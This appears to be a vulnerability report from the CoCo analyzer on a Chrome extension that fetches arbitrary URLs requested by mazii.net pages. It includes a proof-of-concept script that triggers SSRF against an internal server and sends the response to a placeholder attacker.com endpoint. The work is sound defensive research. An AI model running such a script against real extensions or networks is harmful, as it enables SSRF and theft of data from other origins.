# CoCo Analysis: nkkbbhjgjifpbockgfpflchdboolmdmm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (including storage sinks and XMLHttpRequest sinks, some duplicates)

---

## Sink 1: bg_external_port_onMessage → XMLHttpRequest_url_sink (PRIMARY VULNERABILITY)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nkkbbhjgjifpbockgfpflchdboolmdmm/opgen_generated_files/bg.js
Line 1767	            requestXHTML(msg.url, function (data) {
Line 1011	        if (url.indexOf("api.mazii.net") != -1) {
```

**Code:**

```javascript
// Background script (bg.js) - Line 1764-1773
chrome.runtime.onConnectExternal.addListener(function(port) {
    port.onMessage.addListener(function(msg, sender, sendResponse) {
        if (msg.request == "requestUrl") {
            requestXHTML(msg.url, function (data) { // ← attacker-controlled URL
                data = JSON.parse(data);
                port.postMessage({ result: data, requestUrl: msg.url }); // ← sends response back
            });
        }
    });
});

// Line 993-1022: requestXHTML function
function requestXHTML(url, successCallback) {
    var xhr = new XMLHttpRequest();
    try {
        xhr.onreadystatechange = function() {
            if (xhr.readyState != 4)
                return;

            if (xhr.responseText) {
                if (successCallback) {
                    successCallback(xhr.responseText);
                }
            }
        }

        xhr.onerror = function(error) {
        }

        if (url.indexOf("api.mazii.net") != -1) {
            xhr.open("POST", url, true); // ← POST request to attacker URL
            xhr.send(null);
        } else {
            xhr.open("GET", url, true); // ← GET request to attacker URL
            xhr.send(null);
        }

    } catch (e) {
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onConnectExternal from whitelisted domain (*.mazii.net/*)

**Attack:**

```javascript
// Malicious script on mazii.net domain
var port = chrome.runtime.connect('nkkbbhjgjifpbockgfpflchdboolmdmm', {name: 'attack'});

// Trigger SSRF to arbitrary URL
port.postMessage({
  request: "requestUrl",
  url: "http://internal-server/admin" // ← attacker-controlled URL
});

// Listen for response containing sensitive data from the target
port.onMessage.addListener(function(response) {
  console.log("Exfiltrated data:", response.result);
  // Send to attacker's server
  fetch("https://attacker.com/collect", {
    method: "POST",
    body: JSON.stringify(response.result)
  });
});
```

**Impact:** An attacker on *.mazii.net/* domains can trigger arbitrary cross-origin HTTP requests with the extension's elevated privileges (<all_urls> permission). The extension makes GET or POST requests to any attacker-controlled URL and sends the response back to the attacker via port.postMessage. This enables SSRF attacks against internal networks, exfiltration of data from any origin, and bypassing CORS restrictions. The extension has <all_urls> permission, allowing it to access any resource on the internet including internal networks. While manifest.json restricts external connections to *.mazii.net/* domains via externally_connectable, per the methodology this qualifies as TRUE POSITIVE since external entities can trigger the vulnerability.

---

## Sink 2: XMLHttpRequest_responseText_source → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nkkbbhjgjifpbockgfpflchdboolmdmm/opgen_generated_files/bg.js
Line 332	XMLHttpRequest.prototype.responseText = 'sensitive_responseText';
Line 1577	        langPack = JSON.parse(data);
```

**Classification:** FALSE POSITIVE

**Reason:** This detection appears to be in CoCo framework code (Line 332 is setting up a mock/marker), not actual extension code. CoCo detected a flow from XMLHttpRequest responses to storage, but this is internal extension functionality for storing language pack data, not an exploitable vulnerability from an external attacker's perspective.

---

## Sink 3: XMLHttpRequest_responseText_source → bg_external_port_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nkkbbhjgjifpbockgfpflchdboolmdmm/opgen_generated_files/bg.js
Line 332	XMLHttpRequest.prototype.responseText = 'sensitive_responseText';
Line 1768	                data = JSON.parse(data);
```

**Classification:** TRUE POSITIVE (Already covered in Sink 1)

**Reason:** This is part of the same vulnerability as Sink 1. The XMLHttpRequest response (from attacker-controlled URL) is sent back to the attacker via port.postMessage, which is the complete SSRF exploitation chain already documented above.
